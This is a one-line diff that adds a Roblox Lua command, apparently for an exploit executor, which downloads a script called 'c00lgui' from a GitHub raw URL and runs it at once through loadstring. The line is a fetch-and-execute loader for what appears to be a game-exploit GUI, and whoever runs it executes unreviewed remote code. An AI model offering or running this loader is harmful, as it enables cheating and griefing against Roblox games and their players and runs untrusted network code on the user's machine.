@@ -1,0 +1,1 @@
+loadstring(game:HttpsGet("https://raw.githubusercontent.com/deltaexecutoruser/Modern-FE-c00lgui-localscript-/refs/heads/main/c00lgui"))()
